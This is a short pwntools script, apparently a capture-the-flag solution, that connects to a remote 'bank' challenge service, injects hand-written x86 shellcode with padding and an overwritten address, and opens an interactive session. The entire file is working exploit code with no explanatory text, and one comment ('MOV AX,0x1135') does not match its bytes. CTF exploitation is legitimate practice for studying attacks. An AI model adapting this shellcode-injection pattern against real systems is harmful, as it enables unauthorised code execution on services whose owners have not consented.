from pwn import *
p=remote('bank.tghack.no',5432)
#p=process('kvm')

p.sendline('balance')
sh = '\xb8\x00\xee' #MOV AX,0xee
sh += '\x8e\xd8' #MOV DS, AX
sh += '\x66\x68\x00\x00\x00\x00' #PUSH large 0000h
sh += '\xb8\xe5\x11' #MOV AX,0x1135
sh += '\xff\xe0' #JMP AX
pause()
p.sendline(sh+'A'*4+'D'*0x4+p32(0xff7f))

p.interactive()
